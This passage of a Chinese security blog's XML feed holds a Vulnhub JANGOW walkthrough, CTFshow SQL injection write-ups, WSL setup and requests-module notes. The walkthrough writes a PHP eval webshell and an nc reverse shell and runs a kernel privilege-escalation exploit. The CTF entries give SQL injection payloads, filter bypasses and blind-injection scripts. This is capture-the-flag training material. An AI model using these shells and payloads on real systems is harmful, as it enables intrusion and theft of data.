        <content type="html"><![CDATA[<p>在管理员权限下打开powershell，执行以下命令后重启电脑</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 启用适用于 Linux 的 Windows 子系统</span><br><span class="line">dism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart</span><br><span class="line"># 启用虚拟机功能</span><br><span class="line">dism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub靶场-JANGOW-1-0-1</title>
      <link href="/2022/09/25/Vulnhub%E9%9D%B6%E5%9C%BA-JANGOW-1-0-1/"/>
      <url>/2022/09/25/Vulnhub%E9%9D%B6%E5%9C%BA-JANGOW-1-0-1/</url>
      
        <content type="html"><![CDATA[<p>发现靶机开启21端口和80端口，21端口可以考虑爆破，80端口访问+目录爆破<br> 先访问网站看看</p><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/20220925112150.png"></p><p>发现这些地方可以点击</p><p><img src="C:\Users\HP\AppData\Roaming\Typora\typora-user-images\image-20220925112851118.png" alt="image-20220925112851118"></p><p>发现注入点直接判断用户</p><p><img src="C:\Users\HP\AppData\Roaming\Typora\typora-user-images\image-20220925112958657.png" alt="image-20220925112958657"></p><p>直接上传webshell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;&lt;?php eval($_POST[&quot;hack&quot;]);&#x27; &gt; shell.php</span><br></pre></td></tr></table></figure><p>蚁剑连接，在该目录下发现config.php文件，可以获取desafio02数据库的账号密码，经测试没啥用。</p><p><img src="https://img2022.cnblogs.com/blog/2753495/202203/2753495-20220304224016961-2114294978.png" alt="image"></p><p>在下图目录中发现.backup文件，可以获取jangow01数据库的账号密码</p><p><img src="https://img2022.cnblogs.com/blog/2753495/202203/2753495-20220304224233888-1699401301.png" alt="image"></p><p>因为网站使用的是php语言，所以写入一个php反弹shell文件（测试该靶机仅有443端口反弹shell）：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 172.23.156.244 443 &gt;/tmp/f&#x27;</span>);<span class="meta">?&gt;</span>     <span class="comment">#直接在本地写好，用蚁剑上传即可，我保存为test.php</span></span><br></pre></td></tr></table></figure><p>kali监听443端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 443 </span><br></pre></td></tr></table></figure><p>此时访问test.php文件   <a href="http://192.168.147.184/site/test.php">http://192.168.147.184/site/test.php</a>  即可反弹shell</p><p><img src="https://img2022.cnblogs.com/blog/2753495/202203/2753495-20220304225714224-1370394577.png" alt="image"></p><p>写入交互式shell</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="symbol">&#x27;import</span> pty;pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)&#x27;</span><br></pre></td></tr></table></figure><p>whami 发现当前权限是www-data，尝试提权。<br> uname -a 查看系统版本、lsb_release -a查看系统发行版本为Ubuntu 16.04</p><p><img src="https://img2022.cnblogs.com/blog/2753495/202203/2753495-20220304230522300-1356476743.png" alt="image"></p><p>攻击机为kali，靶机环境是ubuntu16.04，使用 searchsploit 看看有没有什么可利用的漏洞。</p><p><img src="https://img2022.cnblogs.com/blog/2753495/202203/2753495-20220305094808719-1432298619.png" alt="image"></p><p>尝试利用45010.c 文件，首先find查看文件路径，找到45010.c文件路径，cp命令将其复制到 /var/www/html目录下，cd进入该目录，开启http服务。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8000</span><br></pre></td></tr></table></figure><p><img src="https://img2022.cnblogs.com/blog/2753495/202203/2753495-20220305095830760-95787890.png" alt="image"></p><p> 开启服务后去靶机执行下列命令。（如果下载不下来，我是利用蚁剑上传的45010.c文件）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.147.178:8000/45010.c  #在靶机下载45010.c文件，传输文件</span><br></pre></td></tr></table></figure><p>进入靶机查看文件45010.c存在</p><img src="https://img2022.cnblogs.com/blog/2753495/202203/2753495-20220305100322608-830163602.png" alt="image" style="zoom:80%;" /><p>gcc 45010.c 编译文件，生成a.out文件</p><p><img src="https://img2022.cnblogs.com/blog/2753495/202203/2753495-20220305100437674-166945897.png" alt="image"></p><p>运行a.out文件，发现获取到root权限。</p><p><img src="https://img2022.cnblogs.com/blog/2753495/202203/2753495-20220305100605200-476281740.png" alt="image"></p><p>进入 /root目录，拿到flag。</p><p><img src="https://img2022.cnblogs.com/blog/2753495/202203/2753495-20220305100731298-1973780317.png" alt="image"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Python requests 模块</title>
      <link href="/2022/09/24/Python-requests-%E6%A8%A1%E5%9D%97/"/>
      <url>/2022/09/24/Python-requests-%E6%A8%A1%E5%9D%97/</url>
      
        <content type="html"><![CDATA[<h1 id="Python-requests-模块"><a href="#Python-requests-模块" class="headerlink" title="Python requests 模块"></a>Python requests 模块</h1><p> 导入 requests 包<br> <strong>import</strong> requests</p><p>  发送请求<br> x = requests.get(‘<a href="https://www.runoob.com/&#39;">https://www.runoob.com/&#39;</a>)</p><p>  返回网页内容<br> <strong>print</strong>(x.text)</p><table><thead><tr><th>属性或方法</th><th>说明</th></tr></thead><tbody><tr><td>apparent_encoding</td><td>编码方式</td></tr><tr><td>close()</td><td>关闭与服务器的连接</td></tr><tr><td>content</td><td>返回响应的内容，以字节为单位</td></tr><tr><td>cookies</td><td>返回一个 CookieJar 对象，包含了从服务器发回的 cookie</td></tr><tr><td>elapsed</td><td>返回一个 timedelta 对象，包含了从发送请求到响应到达之间经过的时间量，可以用于测试响应速度。比如 r.elapsed.microseconds 表示响应到达需要多少微秒。</td></tr><tr><td>encoding</td><td>解码 r.text 的编码方式</td></tr><tr><td>headers</td><td>返回响应头，字典格式</td></tr><tr><td>history</td><td>返回包含请求历史的响应对象列表（url）</td></tr><tr><td>is_permanent_redirect</td><td>如果响应是永久重定向的 url，则返回 True，否则返回 False</td></tr><tr><td>is_redirect</td><td>如果响应被重定向，则返回 True，否则返回 False</td></tr><tr><td>iter_content()</td><td>迭代响应</td></tr><tr><td>iter_lines()</td><td>迭代响应的行</td></tr><tr><td>json()</td><td>返回结果的 JSON 对象 (结果需要以 JSON 格式编写的，否则会引发错误)</td></tr><tr><td>links</td><td>返回响应的解析头链接</td></tr><tr><td>next</td><td>返回重定向链中下一个请求的 PreparedRequest 对象</td></tr><tr><td>ok</td><td>检查 “status_code” 的值，如果小于400，则返回 True，如果不小于 400，则返回 False</td></tr><tr><td>raise_for_status()</td><td>如果发生错误，方法返回一个 HTTPError 对象</td></tr><tr><td>reason</td><td>响应状态的描述，比如 “Not Found” 或 “OK”</td></tr><tr><td>request</td><td>返回请求此响应的请求对象</td></tr><tr><td>status_code</td><td>返回 http 的状态码，比如 404 和 200（200 是 OK，404 是 Not Found）</td></tr><tr><td>text</td><td>返回响应的内容，unicode 类型数据</td></tr><tr><td>url</td><td>返回响应的 URL</td></tr></tbody></table><h2 id="requests-方法"><a href="#requests-方法" class="headerlink" title="requests 方法"></a>requests 方法</h2><p>requests 方法如下表：</p><table><thead><tr><th>delete(<em>url</em>, <em>args</em>)</th><th>发送 DELETE 请求到指定 url</th></tr></thead><tbody><tr><td>get(<em>url</em>, <em>params, args</em>)</td><td>发送 GET 请求到指定 url</td></tr><tr><td>head(<em>url</em>, <em>args</em>)</td><td>发送 HEAD 请求到指定 url</td></tr><tr><td>patch(<em>url</em>, <em>data, args</em>)</td><td>发送 PATCH 请求到指定 url</td></tr><tr><td>post(<em>url</em>, <em>data, json, args</em>)</td><td>发送 POST 请求到指定 url</td></tr><tr><td>put(<em>url</em>, <em>data, args</em>)</td><td>发送 PUT 请求到指定 url</td></tr><tr><td>request(<em>method</em>, <em>url</em>, <em>args</em>)</td><td>向指定的 url 发送指定的请求方法</td></tr></tbody></table>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CTFshow sql注入</title>
      <link href="/2022/09/15/CTFshow-sql%E6%B3%A8%E5%85%A5/"/>
      <url>/2022/09/15/CTFshow-sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="web-171"><a href="#web-171" class="headerlink" title="web 171"></a>web 171</h1><p>首先使用</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure><p>发现有回显</p><p>使用</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; order by 3--+</span></span><br></pre></td></tr></table></figure><p>发现一共是3行</p><p>使用联合查询得到当前数据库的名字</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,2,database()--+</span></span><br></pre></td></tr></table></figure><p>爆表名：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,2,group_concat(table_name) FROM information_schema.tables where table_schema=database()--+</span></span><br></pre></td></tr></table></figure><p>爆破列名：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,2,group_concat(column_name) FROM information_schema.columns where table_schema=database() and table_name=&#x27;</span>ctfshow_user<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure><p>爆破数据：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,2,group_concat(id,username,password) FROM ctfshow_user--+</span></span><br></pre></td></tr></table></figure><h1 id="web-172-173"><a href="#web-172-173" class="headerlink" title="web 172 173"></a>web 172 173</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;select username,password from ctfshow_user2 where username !=&#x27;flag&#x27; and id = &#x27;&quot;.$_GET[<span class="string">&#x27;id&#x27;</span>].&quot;&#x27; limit 1;&quot;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>从过滤中可知大概就是把flag从查询中ban掉了</p><p><strong>解决方法</strong></p><p>利用编码解决：<a href="https://so.csdn.net/so/search?q=base64&spm=1001.2101.3001.7020">base64</a>、hex</p><p>这里针对的是<code>id = &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39;</code>，双引号是包括在内的，可能只是起解析作用</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yn8<span class="string">&#x27;union select to_base64(username),hex(password) from ctfshow_user2--+</span></span><br></pre></td></tr></table></figure><h1 id="web-174"><a href="#web-174" class="headerlink" title="web 174"></a>web 174</h1><p>查询语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;select id,username,password from ctfshow_user2 where username !=&#x27;flag&#x27; and id = &#x27;&quot;.$_GET[<span class="string">&#x27;id&#x27;</span>].&quot;&#x27; limit 1;&quot;;</span><br></pre></td></tr></table></figure><p>返回逻辑：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//检查结果是否有flag</span></span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/flag|[0-9]/i&#x27;</span>, json_encode(<span class="variable">$ret</span>)))&#123;</span><br><span class="line">      <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查询成功&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><a href="https://www.runoob.com/php/php-json.html">PHP JSON</a></p><p>也就是说返回的结果是不能有flag和任何数字，那么就先base64编码，再对数字进行替换，比如对password字段的返回结果进行替换，username字段同理，所以payload如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union select replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(username),&#x27;</span><span class="number">1</span><span class="string">&#x27;,&#x27;</span>numA<span class="string">&#x27;),&#x27;</span><span class="number">2</span><span class="string">&#x27;,&#x27;</span>numB<span class="string">&#x27;),&#x27;</span><span class="number">3</span><span class="string">&#x27;,&#x27;</span>numC<span class="string">&#x27;),&#x27;</span><span class="number">4</span><span class="string">&#x27;,&#x27;</span>numD<span class="string">&#x27;),&#x27;</span><span class="number">5</span><span class="string">&#x27;,&#x27;</span>numE<span class="string">&#x27;),&#x27;</span><span class="number">6</span><span class="string">&#x27;,&#x27;</span>numF<span class="string">&#x27;),&#x27;</span><span class="number">7</span><span class="string">&#x27;,&#x27;</span>numG<span class="string">&#x27;),&#x27;</span><span class="number">8</span><span class="string">&#x27;,&#x27;</span>numH<span class="string">&#x27;),&#x27;</span><span class="number">9</span><span class="string">&#x27;,&#x27;</span>numI<span class="string">&#x27;),&#x27;</span><span class="number">0</span><span class="string">&#x27;,&#x27;</span>numJ<span class="string">&#x27;),replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(password),&#x27;</span><span class="number">1</span><span class="string">&#x27;,&#x27;</span>numA<span class="string">&#x27;),&#x27;</span><span class="number">2</span><span class="string">&#x27;,&#x27;</span>numB<span class="string">&#x27;),&#x27;</span><span class="number">3</span><span class="string">&#x27;,&#x27;</span>numC<span class="string">&#x27;),&#x27;</span><span class="number">4</span><span class="string">&#x27;,&#x27;</span>numD<span class="string">&#x27;),&#x27;</span><span class="number">5</span><span class="string">&#x27;,&#x27;</span>numE<span class="string">&#x27;),&#x27;</span><span class="number">6</span><span class="string">&#x27;,&#x27;</span>numF<span class="string">&#x27;),&#x27;</span><span class="number">7</span><span class="string">&#x27;,&#x27;</span>numG<span class="string">&#x27;),&#x27;</span><span class="number">8</span><span class="string">&#x27;,&#x27;</span>numH<span class="string">&#x27;),&#x27;</span><span class="number">9</span><span class="string">&#x27;,&#x27;</span>numI<span class="string">&#x27;),&#x27;</span><span class="number">0</span><span class="string">&#x27;,&#x27;</span>numJ<span class="string">&#x27;) from ctfshow_user4 where username=&#x27;</span>flag<span class="string">&#x27; --+</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p>然后对爆出的字符串反向替换以下就行了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">flagstr=<span class="string">&quot;YnumCRmcnumBhvdnumCsnumCOTknumEMDdkNynumAhMWIxLTRiYzQtOTEnumJYinumJnumCMWJiZTBlNjFhZTRnumI&quot;</span></span><br><span class="line">flag=flagstr.replace(<span class="string">&#x27;numA&#x27;</span>,<span class="string">&#x27;1&#x27;</span>).replace(<span class="string">&#x27;numB&#x27;</span>,<span class="string">&#x27;2&#x27;</span>).replace(<span class="string">&#x27;numC&#x27;</span>,<span class="string">&#x27;3&#x27;</span>).replace(<span class="string">&#x27;numD&#x27;</span>,<span class="string">&#x27;4&#x27;</span>).replace(<span class="string">&#x27;numE&#x27;</span>,<span class="string">&#x27;5&#x27;</span>).replace(<span class="string">&#x27;numF&#x27;</span>,<span class="string">&#x27;6&#x27;</span>).replace(<span class="string">&#x27;numG&#x27;</span>,<span class="string">&#x27;7&#x27;</span>).replace(<span class="string">&#x27;numH&#x27;</span>,<span class="string">&#x27;8&#x27;</span>).replace(<span class="string">&#x27;numI&#x27;</span>,<span class="string">&#x27;9&#x27;</span>).replace(<span class="string">&#x27;numJ&#x27;</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(flag))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web-175"><a href="#web-175" class="headerlink" title="web 175"></a>web 175</h1><p>查询语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>拼接<span class="keyword">sql</span>语句查找指定ID用户</span><br><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;select id,username,password from ctfshow_user where username !=&#x27;flag&#x27; and id = &#x27;&quot;.$_GET[<span class="string">&#x27;id&#x27;</span>].&quot;&#x27; limit 1;&quot;;</span><br><span class="line">      </span><br></pre></td></tr></table></figure><p>返回逻辑</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>对传入的参数进行了过滤</span><br><span class="line">  <span class="keyword">function</span> waf($str)&#123;</span><br><span class="line">   <span class="operator">/</span><span class="operator">/</span>代码过于简单，不宜展示</span><br><span class="line">  &#125;</span><br><span class="line">      </span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; Union Select id,username,password from ctfshow_user where username=&#x27;</span>flag<span class="string">&#x27; --+</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p>将数据输出到一个文件中，然后访问对应文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select  username,password from ctfshow_user5 into outfile &quot;/var/www/html/1.txt&quot;--+</span><br></pre></td></tr></table></figure><p>使用<code>into outfile &#39;/var/www/html/&#39;</code>将信息输入到文件中去</p><h1 id="web-176"><a href="#web-176" class="headerlink" title="web 176"></a>web 176</h1><p>开始过滤了，第一个是大小写过滤</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; Union Select id,username,password from ctfshow_user where username=&#x27;</span>flag<span class="string">&#x27; --+</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><h1 id="web-177"><a href="#web-177" class="headerlink" title="web 177"></a>web 177</h1><p>第二个是对空格进行了过滤</p><p>可以替代空格的有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">%0a</span><br><span class="line">%0b</span><br><span class="line">%0c</span><br><span class="line">%0d</span><br><span class="line">%09</span><br><span class="line">%a0(在特定字符集才能利用)</span><br><span class="line">以上均为URL编码</span><br><span class="line"></span><br><span class="line">/**/组合</span><br><span class="line">括号</span><br><span class="line">%23代替注释符 -- </span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;%09Union%09Select%09id,username,password%09from`ctfshow_user`where`username`=&#x27;</span>flag<span class="string">&#x27;%23</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;union/**/select/**/id,username,password/**/from`ctfshow_user`where`username`=&#x27;</span>flag<span class="string">&#x27;%23</span></span><br></pre></td></tr></table></figure><h1 id="web-178"><a href="#web-178" class="headerlink" title="web 178"></a>web 178</h1><p>上面的注释符也不能用了，可以用tab<code>%09</code>代替空格：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;%09Union%09Select%09id,username,password%09from`ctfshow_user`where`username`=&#x27;</span>flag<span class="string">&#x27;%23</span></span><br></pre></td></tr></table></figure><h1 id="web-179"><a href="#web-179" class="headerlink" title="web 179"></a>web 179</h1><p>使用换页符%0c代替空格</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;union%0cselect%0cid,username,password%0cfrom`ctfshow_user`where`username`=&#x27;</span>flag<span class="string">&#x27;%23</span></span><br></pre></td></tr></table></figure><h1 id="web-180-181-182"><a href="#web-180-181-182" class="headerlink" title="web 180 181 182"></a>web 180 181 182</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">where</span> username <span class="operator">!=</span><span class="string">&#x27;flag&#x27;</span> <span class="keyword">and</span> id <span class="operator">=</span> <span class="string">&#x27;&#x27;</span><span class="keyword">or</span>(id<span class="operator">=</span><span class="number">26</span>)<span class="keyword">and</span><span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span> limit <span class="number">1</span></span><br><span class="line"><span class="keyword">where</span> (username <span class="operator">!=</span><span class="string">&#x27;flag&#x27;</span> <span class="keyword">and</span> id <span class="operator">=</span> <span class="string">&#x27;&#x27;</span>)<span class="keyword">or</span>(id<span class="operator">=</span><span class="number">26</span> <span class="keyword">and</span><span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span>) limit <span class="number">1</span></span><br><span class="line">因为<span class="keyword">or</span>的存在，相当于要<span class="keyword">select</span>两次，但又因为<span class="keyword">or</span>左边是为<span class="number">0</span>的，右边为id<span class="operator">=</span><span class="number">26</span>，所以只<span class="keyword">select</span>右边</span><br><span class="line">完整的<span class="keyword">sql</span>语句变为：<span class="keyword">select</span> id,username,password <span class="keyword">from</span> ctfshow_user <span class="keyword">where</span> id<span class="operator">=</span><span class="number">26</span> limit <span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>关于优先级问题就跟加减号与乘除号一样，and先运算，那么and的运算结果过程如何解释：需要同时满足两边的条件才会返回true，否则不执行啊！那么这里就是让第一个and语句返回false让后面的and语句来做到知行的效果</p><p><strong>payload：</strong><code>&#39;or(id=26)and&#39;1&#39;=&#39;1</code></p><h1 id="web-183"><a href="#web-183" class="headerlink" title="web 183"></a>web 183</h1><p>本题使用post传参，我们使用like进行模糊查询，</p><p>解题思路：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">括号代替的是空格</span><br><span class="line">tableName=(ctfshow_user)where(pass)like&#x27;ctfshow&#123;%&#x27;</span><br><span class="line">% ：在sql中通配 N 个字符</span><br><span class="line">_ ：通配任意一个字符</span><br><span class="line">会发现返回结果  $user_count = 1;代表匹配到了一个，利用此模式盲注</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://fce795b7-8a53-4c95-9fe2-e0def05a0df8.challenge.ctf.show/select-waf.php&#x27;</span></span><br><span class="line">letter = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">150</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> letter:</span><br><span class="line">        payload = &#123;<span class="string">&quot;tableName&quot;</span>:<span class="string">&quot;(ctfshow_user)where(pass)like&#x27;&#123;&#125;%&#x27;&quot;</span>.<span class="built_in">format</span>(flag+j)&#125;</span><br><span class="line">        r = requests.post(url=url,data=payload).text</span><br><span class="line">        <span class="built_in">print</span> (r)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;$user_count = 1;&quot;</span> <span class="keyword">in</span> r:</span><br><span class="line">            flag+=j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> j==<span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">            sys.exit()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web-184"><a href="#web-184" class="headerlink" title="web 184"></a>web 184</h1><p>python脚本</p><p>利用到了<a href="https://www.runoob.com/mysql/mysql-regexp.html">mysql中的regexp正则匹配</a></p><p><a href="https://www.cnblogs.com/zeroingToOne/p/9575203.html">MySQL中的内连接、左连接、右连接、全连接、交叉连接</a></p><p><a href="https://www.runoob.com/w3cnote/sql-join-the-different-of-on-and-where.html">SQL JOIN 中 on 与 where 的区别</a>：在此脚本中是用on代替了where</p><p>利用having来代替where也是作为一个条件判断子句</p><p>利用16进制代替引号</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://683f40c0-31e4-46a7-bed1-f8eb216b7515.challenge.ctf.show:8080/select-waf.php&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line">letter = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">asc2hex</span>(<span class="params">s</span>):</span></span><br><span class="line">    a1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    a2 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        a1+=<span class="built_in">hex</span>(<span class="built_in">ord</span>(i))</span><br><span class="line">    a2 = a1.replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> a2</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> letter:</span><br><span class="line">        payload = &#123;</span><br><span class="line">            <span class="string">&quot;tableName&quot;</span>:<span class="string">&quot;ctfshow_user group by pass having pass like &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;0x&quot;</span>+asc2hex(flag+j+<span class="string">&quot;%&quot;</span>))</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url=url,data=payload).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;$user_count = 1;&quot;</span> <span class="keyword">in</span> r:</span><br><span class="line">            flag+=j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> j == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">                sys.exit()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 